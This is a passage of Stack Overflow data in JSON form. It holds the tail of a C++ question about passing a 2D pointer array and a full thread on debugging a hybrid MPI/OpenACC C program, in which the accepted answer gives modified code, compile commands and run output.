"https://graph.facebook.com/1510289822616019/picture?type=large", "display_name": "Yuri Suzumiya", "link": "https://stackoverflow.com/users/5446002/yuri-suzumiya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "closed_date": 1444840721, "accepted_answer_id": 33130967, "answer_count": 1, "score": -1, "last_activity_date": 1444845265, "creation_date": 1444840461, "last_edit_date": 1444845265, "question_id": 33130895, "link": "https://stackoverflow.com/questions/33130895/c-having-trouble-passing-a-2d-array-of-pointers-into-a-function", "closed_reason": "Duplicate", "title": "C++.Having trouble passing a 2D array of pointers into a function", "body": "<p>I am making a small text based game.\nmy code works if i have it in the main function, but when trying to put it into it's own function it fills my strings with garbage data which eventually causes the program to crash when it tries to read the data.</p>\n\n<p>So here is my question, how should i be passing my 2D array of Room pointers into my function so i can get the same result that i would if i just kept the code in my main function.</p>\n\n<p>The Following is the code currently in my function which will work fine when not in a function.</p>\n\n<pre><code>void InitialiseLevel(int CurrentLevel, Room *Level[2][2]){\nif (CurrentLevel == 1){\n\n    JumpScareRoom JSRoom1;\n    Room *room1 = &amp;JSRoom1;\n    JSRoom1.SetExits(\"se\");\n    JSRoom1.SetDescriptions(\"I am a jumpscare room.\", \"I am a boring room 1\");\n    JSRoom1.SetSouthMessages(\"There is a door to the SOUTH\", \"You exit through the SOUTH door.\");\n    JSRoom1.SetEastMessages(\"There is a door to the EAST\", \"You exit through the EAST door.\");\n    Room room2;\n    room2.SetExits(\"ws\");\n    room2.SetDescriptions(\"I am a cool room 2\", \"I am a boring room 2\");\n    Room room3;\n    room3.SetExits(\"ne\");\n    room3.SetDescriptions(\"I am a cool room 3\", \"I am a boring room 3\");\n    Room room4;\n    room4.SetExits(\"wn\");\n    room4.SetDescriptions(\"I am a cool room 4\", \"I am a boring room 4\");\n\n    Level[0][0] = room1;\n    Level[0][1] = &amp;room2;\n    Level[1][0] = &amp;room3;\n    Level[1][1] = &amp;room4;\n}\n}\n</code></pre>\n\n<p>my main initializes the array as</p>\n\n<pre><code>Room *Rooms[2][2] = {};\n</code></pre>\n\n<p>it then calls the function using</p>\n\n<pre><code>InitialiseLevel(1, Rooms); // set up level 1.\n</code></pre>\n\n<p>I have tried many different methods such as using </p>\n\n<pre><code>void InitialiseLevel(int CurrentLevel, Room **Level[2][2])\n</code></pre>\n\n<p>and</p>\n\n<pre><code>void InitialiseLevel(int CurrentLevel, Room *(&amp;Level)[2][2])\n</code></pre>\n\n<p>however i seem to be missing something important.</p>\n"}, {"tags": ["c", "cuda", "mpi", "openacc"], "comments": [{"owner": {"reputation": 4037, "user_id": 4056099, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/xF37X.jpg?s=128&g=1", "display_name": "NoseKnowsAll", "link": "https://stackoverflow.com/users/4056099/noseknowsall"}, "edited": false, "score": 0, "creation_date": 1444841577, "post_id": 33130676, "comment_id": 54074034, "body": "I don&#39;t have much experience with OpenACC, but it sounds like you are sending the data to the wrong coprocessor. That is, when you&#39;re debugging it, I would look to confirm that each node is sending its data to its own appropriate coprocessor(s), and that each coprocessor correctly receives the right data."}, {"owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "edited": false, "score": 3, "creation_date": 1444842114, "post_id": 33130676, "comment_id": 54074367, "body": "I think you should provide a complete MCVE.  Note that SO <a href=\"http://stackoverflow.com/help/on-topic\">expects</a> for questions seeking debugging help, that you to provide this <i>in the question itself</i>, not in an external repository.  You should also describe your setup a bit.  What mpi command are you using to invoke this?  Do you expect all of the ranks GPU codes to run on a single GPU?  What is the compute mode setting for that GPU?  Are you using cuda MPS ?"}, {"owner": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1444850285, "post_id": 33130676, "comment_id": 54079102, "body": "I will provide a complete MCVE for this post."}, {"owner": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1444924594, "post_id": 33130676, "comment_id": 54115644, "body": "I have updated my post with a complete MCVE, my specifications and commands used for compiling and running the code. I have also included the link to the input file used by the code. Also in this version I couldn&#39;t get openacc to work at all however solution to this should help me a lot. Thanks"}], "answers": [{"comments": [{"owner": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445529345, "post_id": 33249431, "comment_id": 54370917, "body": "For some reason it looks like the non-OpenACC version (compile without -acc) still compiles an accelerated code and therefore the output matches the OpenACC version (compile with -acc). The output produced by compiling the code with <code>mpicc</code> and running with [1-8] ranks all produce the same and correct result. But the output produced by OpenACC (with and without -acc) produces incorrect results. Although I am using <code>pgcc</code> compiler instead of <code>pgc++</code> which shouldn&#39;t make a difference. Could you check the diff between the output from <code>mpicc</code> and <code>openacc</code>."}, {"owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "reply_to_user": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445529700, "post_id": 33249431, "comment_id": 54371162, "body": "Sorry, I should have been more clear when I said the non-OpenACC version.  I am compiling without <code>-acc -ta=tesla:managed -Minfo=accel</code>.  That will definitely produce a version that does not use OpenACC, and that version matches the data produced by the OpenACC version."}, {"owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "reply_to_user": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445530263, "post_id": 33249431, "comment_id": 54371502, "body": "If I run the OpenACC version of the  code in my answer with a single mpi rank (mpirun -n 1) it matches the output from the non-ACC case and the openACC case without MPI.  If I run the non-OpenACC version with a single MPI rank, and compare the non-OpenACC version with 2 MPI ranks, the outputs don&#39;t match.  I think the issue is in how this code is structured to use MPI, not in how it is using OpenACC.  The OpenACC results are always consistent with the non-OpenACC results, for every case I&#39;ve tried."}, {"owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "reply_to_user": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445531072, "post_id": 33249431, "comment_id": 54371913, "body": "I&#39;ve updated my answer at the end to show the full terminal session of compiling the code in my answer without OpenACC (using mpicc and the PGI toolchain) and running a 1-rank run and a 2-rank run.  Using this code and this toolchain, the MPI 1-rank and 2-rank results do  not match.  This has nothing to do with OpenACC. Furthermore, although I haven&#39;t shown it, the MPI 1 rank run <b>with</b> OpenACC output matches the MPI 1 rank run <b>without</b> OpenACC output, and the MPI 2-rank run <b>with</b> OpenACC output  matches the MPI 2-rank run <b>without</b> OpenACC."}, {"owner": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445531824, "post_id": 33249431, "comment_id": 54372356, "body": "I see what you are saying the results are a little different with different MPI ranks. But I am not getting same results for single rank openACC and nonOpenACC case and I am so confused to why that is the."}, {"owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "reply_to_user": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445532628, "post_id": 33249431, "comment_id": 54372824, "body": "Apparently the results differ between <code>pgcc</code> and <code>pgc++</code>  I&#39;m not sure why yet.  Can you try switching to pgc++ to see if your non-ACC and ACC results match in that case?"}, {"owner": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445533077, "post_id": 33249431, "comment_id": 54373090, "body": "I get compilation errors using <code>pgc++</code>. It does not like the <code>mpi</code> libraries and i am not sure if I need to have <code>c++</code> <code>mpi</code> libraries to use it with <code>pgc++</code>"}, {"owner": {"reputation": 217, "user_id": 4581734, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oJcyy.jpg?s=128&g=1", "display_name": "anupshrestha", "link": "https://stackoverflow.com/users/4581734/anupshrestha"}, "edited": false, "score": 0, "creation_date": 1445541600, "post_id": 33249431, "comment_id": 54377835, "body": "I was able to compile the code with <code>pgc++</code> compiler and the results are same for the non-ACC and ACC versions. I am not sure if it makes sense for the different results between <code>pgcc</code> and <code>pgc++</code> but this should solve my problem. Thank you."}], "tags": [], "owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "is_accepted": true, "score": 2, "last_activity_date": 1445530900, "last_edit_date": 1445530900, "creation_date": 1445390458, "answer_id": 33249431, "question_id": 33130676, "link": "https://stackoverflow.com/questions/33130676/writing-a-hybrid-mpi-openacc-program/33249431#33249431", "title": "Writing a hybrid MPI/OpenACC program", "body": "<blockquote>\n  <p>Also in this version I couldn't get openacc to work at all however solution to this should help me a lot.</p>\n</blockquote>\n\n<p>Here's what I've found:</p>\n\n<ol>\n<li><p>When you use the managed memory facility:</p>\n\n<pre><code>-ta=tesla:managed\n</code></pre>\n\n<p>typically we don't include <code>data</code> directives or clauses in our code.  The idea is to let the cuda managed memory runtime manage data movement for us.  So I commented out what I thought were two \"extraneous\" data directives.</p></li>\n<li><p>I don't believe your <code>parallel</code> accelerator directive is correctly formed.  My compiler (PGI 15.7) barks at me that the <code>independent</code> directive inside the parallel region is not correct:</p>\n\n<pre><code>PGCC-S-0155-Illegal context(parallel) for independent  (t2.c: 228)\n</code></pre>\n\n<p>changing the <code>#pragma acc parallel</code> to <code>#pragma acc kernels</code> is one possible workaround.</p></li>\n<li><p>Your code spits out some compiler warnings around the use of <code>INFINITY</code>.  Since these are just warnings, I didn't bother to address them.</p></li>\n<li><p>For some reason, I found that the compiler wasn't handling the <code>SweepInfo</code> structure (<code>s</code>) properly on entry into the accelerator region.  To work around this, I modified this:</p>\n\n<pre><code>int x, y, z, i, j, k, index;\n#pragma acc parallel\n{\n  #pragma acc loop independent\n  for(x = xs; x &lt;= xe; x++) {\n    #pragma acc loop independent\n    for(y = ys; y &lt;= ye; y++) {\n      z = level - (x+y);\n      if(z &gt; 0 &amp;&amp; z &lt;= NZ-2) {\n        i = abs(z-s-&gt;zSweepOff);\n        j = abs(y-s-&gt;ySweepOff);\n        k = abs(x-s-&gt;xSweepOff);\n</code></pre>\n\n<p>to this:</p>\n\n<pre><code>int x, y, z, i, j, k, index;\nint xSO = s-&gt;xSweepOff;\nint ySO = s-&gt;ySweepOff;\nint zSO = s-&gt;zSweepOff;\n#pragma acc kernels\n{\n  #pragma acc loop independent\n  for(x = xs; x &lt;= xe; x++) {\n    #pragma acc loop independent\n    for(y = ys; y &lt;= ye; y++) {\n      z = level - (x+y);\n      if(z &gt; 0 &amp;&amp; z &lt;= NZ-2) {\n        i = abs(z-zSO);\n        j = abs(y-ySO);\n        k = abs(x-xSO);\n</code></pre>\n\n<p>I'll probably chew on this some more.  I think there is either a limitation here I don't understand or else a compiler bug.</p></li>\n</ol>\n\n<p>With the above changes, I was able to get your code to run to completion without any obvious issues.  Here is my modified code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include &lt;string.h&gt;\n#include \"mpi.h\"\n\n#define min(a,b) (a &gt; b) ? b : a\n#define max(a,b) (a &lt; b) ? b : a\n\n#define NPES 8 // max number of PEs allowed\n#define DEFAULT_BORDER_LOCATION   -1\n#define DEFAULT_BORDER_DISTANCE   INFINITY\n#define DEFAULT_INTERIOR_DISTANCE 90000\n\ntypedef struct {\n  int order;\n  int firstLevel, lastLevel, level;\n  int xDim, yDim, zDim;\n  int xSweepOff, ySweepOff, zSweepOff;\n  double dx, dy, dz;\n} SweepInfo;\n\ntypedef struct {\n  double   dx, dy, dz;\n  int * location;\n  double * distance;\n} Phi;\n\ntypedef struct {\n  int x, y, z;\n} Grid3D;\n\n\n\nvoid calc_dist_field( Phi * p, int totalNodes );\nvoid write_to_file(double * dist);\nstatic SweepInfo make_sweepInfo( Phi * p, int my_rank );\nstatic void fast_sweep( Phi * p, SweepInfo * s );\nstatic double solveEikonal(Phi * p, int index, int max_x, int max_y);\nstatic void update_distance(Phi * p, int totalNodes);\nstatic void set_distance_negative_inside(Phi * p, int totalNodes);\nstatic void adjust_boundary( Phi * p );\n\n\n// public method declarations\nGrid3D make_grid3D(int x, int y, int z);\nvoid vti_get_dimensions(FILE *vti, double *d);\nvoid vti_get_data(FILE *vti, int *l, int b_l, double *d, double b_d, Grid3D g);\n\n// private method declarations\nstatic void move_file_pointer(FILE *file_ptr, int lineNumber, int r);\nstatic void get_location(FILE *vti, int *l, int b_l, Grid3D g);\nstatic void get_distance(FILE *vti, double *d, double b_d, Grid3D g);\n\nstatic int npes;          // Number of PEs\nstatic int my_rank;       // Rank of the PE\nstatic char * fileName;\nstatic char * outfileName;\n\nstatic int NX, NY, NZ, totalNodes;\n\nint main(int argc, char *argv[]) {\n\n  // MPI startup routine\n  MPI_Init(&amp;argc, &amp;argv);\n  MPI_Comm_rank(MPI_COMM_WORLD, &amp;my_rank);\n  MPI_Comm_size(MPI_COMM_WORLD, &amp;npes);\n\n  fileName    = argv[1];\n  outfileName = argv[2];\n  FILE *f = fopen(fileName, \"r\");\n\n  double dims[6];\n  vti_get_dimensions(f, dims);\n  NX = dims[0] + 3;\n  NY = dims[1] + 3;\n  NZ = dims[2] + 3;\n\n  totalNodes = NX * NY * NZ;\n  Phi *p = (Phi *) malloc(sizeof(Phi));\n  p-&gt;location = (int *) malloc(sizeof(int) * totalNodes);\n  p-&gt;distance = (double *) malloc(sizeof(double) * totalNodes);\n\n  p-&gt;dx = dims[3]; p-&gt;dy = dims[4]; p-&gt;dz = dims[5];\n\n  vti_get_data( f, p-&gt;location, DEFAULT_BORDER_LOCATION,\n                   p-&gt;distance, DEFAULT_BORDER_DISTANCE,\n                make_grid3D(NX, NY, NZ));\n\n\n  update_distance(p, totalNodes);\n\n  calc_dist_field(p, totalNodes);\n\n  MPI_Finalize();\n  return 0;\n}\n\nvoid calc_dist_field( Phi * p, int totalNodes ) {\n\n  int sweepNumber = my_rank + 1;\n  double * tmp_dist;\n\n  MPI_Barrier(MPI_COMM_WORLD);\n  if(my_rank == 0){\n    tmp_dist = (double *) malloc( totalNodes * sizeof(double) );\n  }\n\n  // sn represents the sweep number\n  for( int sn = sweepNumber; sn &lt;= NPES; sn += npes) {\n    SweepInfo s = make_sweepInfo(p, sn);\n\n    printf(\"PE: [%d] - performing sweep number ..... [%d/%d]\\n\", my_rank, sn, NPES);\n\n    fast_sweep(p, &amp;s);\n\n    printf(\"PE: [%d] - completed sweep number ...... [%d/%d]\\n\", my_rank, sn, NPES);\n\n  }\n\n  MPI_Barrier(MPI_COMM_WORLD);\n//  #pragma acc update host(p-&gt;distance[0:totalNodes])\n  MPI_Reduce(p-&gt;distance, tmp_dist, totalNodes, MPI_DOUBLE, MPI_MIN, 0, MPI_COMM_WORLD);\n\n  if( my_rank == 0 ) {\n    free( p-&gt;distance );\n    p-&gt;distance = tmp_dist;\n    set_distance_negative_inside(p, totalNodes);\n    adjust_boundary(p);\n    write_to_file(p-&gt;distance);\n    printf(\"%s file created\\n\", outfileName);\n  }\n\n}\n\nstatic void update_distance(Phi * p, int totalNodes) {\n\n  int    *l = &amp;p-&gt;location[0];\n  double *d = &amp;p-&gt;distance[0];\n\n  for(int i = 0; i &lt; totalNodes; i++) {\n    if(*l != DEFAULT_BORDER_LOCATION &amp;&amp; *d != DEFAULT_BORDER_DISTANCE ) {\n      *d = (*l == 1 &amp;&amp; *d == INFINITY) ? -1 : (*d &gt; 0.0 || *d &lt; 0.0) ? *d : DEFAULT_INTERIOR_DISTANCE;\n    }\n    l++; d++;\n  }\n\n}\n\n\n\nvoid write_to_file(double * dist) {\n\n  int x = NX;\n  int y = NY;\n  int z = NZ;\n  char fname[255];\n  sprintf(fname, \"%s.txt\", outfileName);\n  FILE *fp = fopen(fname, \"w\");\n\n  int i,j,k;\n  double *t = &amp;dist[0];\n  for(i = 0; i &lt; z; i++){\n    for(j = 0; j &lt; y; j++){\n      for(k = 0; k &lt; x; k++) {\n    fprintf(fp, \"%f  \", *(t++));\n      }\n      fprintf(fp, \"\\n\");\n    }\n    fprintf(fp, \"\\n\");\n  }\n\n}\n\n\nstatic SweepInfo make_sweepInfo( Phi * p, int my_rank ) {\n  SweepInfo s;\n\n  s.order      = my_rank;\n  s.firstLevel = 3;\n  s.lastLevel  = (NX + NY + NZ) - 6;\n\n  s.xDim = NX-2; s.dx = p-&gt;dx;\n  s.yDim = NY-2; s.dy = p-&gt;dy;\n  s.zDim = NZ-2; s.dz = p-&gt;dz;\n\n  s.xSweepOff = (s.order == 4 || s.order == 8 ) ? s.xDim + 1 : 0;\n  s.ySweepOff = (s.order == 2 || s.order == 6 ) ? s.yDim + 1 : 0;\n  s.zSweepOff = (s.order == 3 || s.order == 7 ) ? s.zDim + 1 : 0;\n\n  return s;\n}\n\nstatic void fast_sweep( Phi * p, SweepInfo * s ) {\n\n  int start, end, incr;\n\n  start = ( s-&gt;order == 2 || s-&gt;order == 5 || s-&gt;order == 7 || s-&gt;order == 8 ) ? s-&gt;lastLevel : s-&gt;firstLevel;\n\n  if ( start == s-&gt;firstLevel ) {\n    end  = s-&gt;lastLevel + 1;\n    incr = 1;\n  }\n  else {\n    end  = s-&gt;firstLevel - 1;\n    incr = 0;\n  }\n\n  int max_x  = s-&gt;xDim + 2;\n  int max_y  = s-&gt;yDim + 2;\n  int max_xy = max_x * max_y;\n\n  //#pragma acc data create(p[0:1]) copy(p-&gt;distance[0:totalNodes])\n  for(int level = start; level != end; level = (incr) ? level+1 : level-1) {\n    // s - start, e - end\n    int xs, xe, ys, ye;\n\n    xs = max(1, level-(s-&gt;yDim + s-&gt;zDim))    , ys = max(1,level-(s-&gt;xDim + s-&gt;zDim));\n    xe = min(s-&gt;xDim, level-(s-&gt;firstLevel-1)), ye = min(s-&gt;yDim, level-(s-&gt;firstLevel-1));\n\n    int x, y, z, i, j, k, index;\n    int xSO = s-&gt;xSweepOff;\n    int ySO = s-&gt;ySweepOff;\n    int zSO = s-&gt;zSweepOff;\n    #pragma acc kernels\n    {\n      #pragma acc loop independent\n      for(x = xs; x &lt;= xe; x++) {\n        #pragma acc loop independent\n        for(y = ys; y &lt;= ye; y++) {\n          z = level - (x+y);\n          if(z &gt; 0 &amp;&amp; z &lt;= NZ-2) {\n            i = abs(z-zSO);\n            j = abs(y-ySO);\n            k = abs(x-xSO);\n            index = i * max_xy + j * max_x + k;\n            p-&gt;distance[index] = solveEikonal(p, index, NX, NY);\n          }\n        }\n      } // end of acc parallel\n    }\n  }\n}\n\n#pragma acc routine seq\nstatic double solveEikonal(Phi * p, int index, int max_x, int max_y) {\n\n  int max_xy = max_x * max_y;\n\n  double dist_new = 0;\n  double dist_old = p-&gt;distance[index];\n\n  double dx = p-&gt;dx, dy = p-&gt;dy, dz = p-&gt;dz;\n  double minX = min(p-&gt;distance[index-1], p-&gt;distance[index+1]);\n  double minY = min(p-&gt;distance[abs(index-max_x)], p-&gt;distance[abs(index+max_x)]);\n  double minZ = min(p-&gt;distance[abs(index-max_xy)],p-&gt;distance[abs(index+max_xy)]);\n\n  double m[] = { minX, minY, minZ} ;\n  double d[] = { dx, dy, dz};\n\n  // sort the mins \n  for(int i = 1; i &lt; 3; i++){\n    for(int j = 0; j &lt; 3-i; j++) {\n      if(m[j] &gt; m[j+1]) {\n        double tmp_m = m[j];\n        double tmp_d = d[j];\n        m[j] = m[j+1]; d[j] = d[j+1];\n        m[j+1] = tmp_m; d[j+1] = tmp_d;\n      }\n    }\n  }\n\n  // simplifying the variables\n  double m_0 = m[0], m_1 = m[1], m_2 = m[2];\n  double d_0 = d[0], d_1 = d[1], d_2 = d[2]; \n  double m2_0 = m_0 * m_0, m2_1 = m_1 * m_1, m2_2 = m_2 * m_2;\n  double d2_0 = d_0 * d_0, d2_1 = d_1 * d_1, d2_2 = d_2 * d_2;\n\n  dist_new = m_0 + d_0;\n  if(dist_new &gt; m_1) {\n\n    double s = sqrt(- m2_0 + 2 * m_0 * m_1 - m2_1 + d2_0 + d2_1); \n    dist_new = ( m_1 * d2_0 + m_0 * d2_1 + d_0 * d_1 * s) / (d2_0 + d2_1);\n\n    if(dist_new &gt; m_2) {\n\n      double a = sqrt(- m2_0 * d2_1 - m2_0 * d2_2 + 2 * m_0 * m_1 * d2_2\n                      - m2_1 * d2_0 - m2_1 * d2_2 + 2 * m_0 * m_2 * d2_1\n                      - m2_2 * d2_0 - m2_2 * d2_1 + 2 * m_1 * m_2 * d2_0\n                      + d2_0 * d2_1 + d2_0 * d2_2 + d2_1 * d2_2);\n\n      dist_new = (m_2 * d2_0 * d2_1 + m_1 * d2_0 * d2_2 + m_0 * d2_1 * d2_2 + d_0 * d_1 * d_2 * a) /\n                  (d2_0 * d2_1 + d2_0 * d2_2 + d2_1 * d2_2);\n    }\n  }\n\n  return min(dist_old, dist_new);\n}\n\n\n\nstatic void set_distance_negative_inside(Phi * p, int totalNodes) {\n\n  int    *l = &amp;p-&gt;location[0];\n  double *d = &amp;p-&gt;distance[0];\n\n  for(int i = 0; i &lt; totalNodes; i++) {\n    if(*l != DEFAULT_BORDER_LOCATION &amp;&amp; *d != DEFAULT_BORDER_DISTANCE ) {\n      if( *l == 1) *d = -1;\n    }\n    l++; d++;\n  }\n\n}\n\nstatic void adjust_boundary( Phi * p ) {\n\n  int x, y, z, xy, i, j, k;\n  x  = NX;\n  y  = NY;\n  z  = NZ;\n  xy = x * y;\n\n  for(i = 0; i &lt; z; i++){\n    for(j = 0; j &lt; y; j++){\n      for(k = 0; k &lt; x; k++){\n        int I = i, J = j, K = k;\n        I = (i == z-1) ? I-1 : (!i) ? I+1 : I;\n        J = (j == y-1) ? J-1 : (!j) ? J+1 : J;\n        K = (k == x-1) ? K-1 : (!k) ? K+1 : K;\n        if( i != I || j != J || k != K) {\n            int l_index = i * xy + j * x + k;\n            int r_index = I * xy + J * x + K;\n            p-&gt;distance[l_index] = p-&gt;distance[r_index];\n        }\n      }\n    }\n  }\n}\n\n\n\n/**************** vti_parser ********************************/\n\nstatic void move_file_pointer(FILE *file_ptr, int lineNumber, int r) {\n    char tmpStr[512];\n    if(r) rewind(file_ptr);\n    while (lineNumber &gt; 0){\n        fgets (tmpStr, 511, file_ptr);\n        lineNumber--;\n    }\n}\n\nvoid vti_get_dimensions(FILE *vti, double *d) {\n    char tmpStr[512];\n    rewind(vti);\n    while (1) {\n        fgets (tmpStr, 511, vti);\n        if ( strstr(tmpStr, \"ImageData WholeExtent\") ) {\n            sscanf(tmpStr, \"    &lt;ImageData WholeExtent=\\\"0 %lf 0 %lf 0 %lf\\\" Spacing=\\\"%lf %lf %lf\\\"&gt;\",\n                    &amp;d[0], &amp;d[1], &amp;d[2], &amp;d[3], &amp;d[4], &amp;d[5]);\n            break;\n        }\n    }\n}\n\n\nvoid vti_get_data(FILE *vti, int *l, int b_l, double *d, double b_d, Grid3D g) {\n\n    // move the file pointer to\n    // line 6 from beginning\n    move_file_pointer(vti, 6, 1);\n\n    get_location(vti, l, b_l, g);\n\n    // move the file pointer 2 lines\n    // forward from its last position\n    move_file_pointer(vti, 2, 0);\n\n    get_distance(vti, d, b_d, g);\n\n}\n\nstatic void get_location(FILE *vti, int *l, int b_l, Grid3D g) {\n    int i, j, k, *t = &amp;l[0];\n    for (i = 0; i &lt; g.z; i++){\n        for (j = 0; j &lt; g.y; j++) {\n            for (k = 0; k &lt; g.x; k++) {\n                // Border\n                if (k == 0 || k == g.x-1 || j == 0 || j == g.y-1 || i == 0 || i == g.z-1 ) {\n                    *(t++) = b_l;\n                }\n                else{ // Interior\n                    fscanf(vti, \"%d \", t++);\n                }\n            }\n        }\n    }\n}\n\n\n\nstatic void get_distance(FILE *vti, double *d, double b_d, Grid3D g) {\n    int i, j, k;\n    double *t = &amp;d[0];\n    for (i = 0; i &lt; g.z; i++){\n        for (j = 0; j &lt; g.y; j++) {\n            for (k = 0; k &lt; g.x; k++) {\n                // Border distance\n                if (k == 0 || k == g.x-1 || j == 0 || j == g.y-1 || i == 0 || i == g.z-1 ) {\n                    *(t++) = b_d;\n                }\n                else{ // Interior distance\n                    fscanf(vti, \"%lf \", t++);\n                }\n            }\n        }\n    }\n}\n\nGrid3D make_grid3D(int x, int y, int z){\n    Grid3D g;\n    g.x = x; g.y = y; g.z = z;\n\n    return g;\n}\n</code></pre>\n\n<p>Here is my compile command:</p>\n\n<pre><code>pgc++ -fast -acc -ta=tesla:managed -Minfo=accel -I/opt/pgi/linux86-64/15.7/mpi/mpich/include -L/opt/pgi/linux86-64/15.7/mpi/mpich/lib -lmpi t2.c -o t2\n</code></pre>\n\n<p>And this is the output:</p>\n\n<pre><code>$ LD_LIBRARY_PATH=/opt/pgi/linux86-64/15.7/mpi/mpich/lib ./t2 input.vti output\nPE: [0] - performing sweep number ..... [1/8]\nPE: [0] - completed sweep number ...... [1/8]\nPE: [0] - performing sweep number ..... [2/8]\nPE: [0] - completed sweep number ...... [2/8]\nPE: [0] - performing sweep number ..... [3/8]\nPE: [0] - completed sweep number ...... [3/8]\nPE: [0] - performing sweep number ..... [4/8]\nPE: [0] - completed sweep number ...... [4/8]\nPE: [0] - performing sweep number ..... [5/8]\nPE: [0] - completed sweep number ...... [5/8]\nPE: [0] - performing sweep number ..... [6/8]\nPE: [0] - completed sweep number ...... [6/8]\nPE: [0] - performing sweep number ..... [7/8]\nPE: [0] - completed sweep number ...... [7/8]\nPE: [0] - performing sweep number ..... [8/8]\nPE: [0] - completed sweep number ...... [8/8]\noutput file created\n$\n</code></pre>\n\n<p>In my case, it seemed to run faster than the non-OpenACC version (compile without <code>-acc -ta=tesla:managed -Minfo=accel</code>) and I <code>diff</code>-ed the output files created and they were the same between non-OpenACC and OpenACC versions.</p>\n\n<p>I also tried running this code with 2 MPI ranks.  It seemed to run without crashing: </p>\n\n<pre><code>$ LD_LIBRARY_PATH=/opt/pgi/linux86-64/15.7/mpi/mpich/lib /opt/pgi/linux86-64/15.7/mpi/mpich/bin/mpirun -n 2 ./t2 input.vti output\nPE: [1] - performing sweep number ..... [2/8]\nPE: [0] - performing sweep number ..... [1/8]\nPE: [0] - completed sweep number ...... [1/8]\nPE: [0] - performing sweep number ..... [3/8]\nPE: [1] - completed sweep number ...... [2/8]\nPE: [1] - performing sweep number ..... [4/8]\nPE: [0] - completed sweep number ...... [3/8]\nPE: [0] - performing sweep number ..... [5/8]\nPE: [1] - completed sweep number ...... [4/8]\nPE: [1] - performing sweep number ..... [6/8]\nPE: [0] - completed sweep number ...... [5/8]\nPE: [0] - performing sweep number ..... [7/8]\nPE: [1] - completed sweep number ...... [6/8]\nPE: [1] - performing sweep number ..... [8/8]\nPE: [0] - completed sweep number ...... [7/8]\nPE: [1] - completed sweep number ...... [8/8]\noutput file created\n$\n</code></pre>\n\n<p>The output data file was different from the single rank version, but it matched the version produced by a two-rank non-OpenACC run.  So if there are any remaining issues, I think they are MPI related and not OpenACC related.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>To exand on this last point, let's take OpenACC out of the picture, but just use the MPI (MPICH) that comes with the PGI 15.7 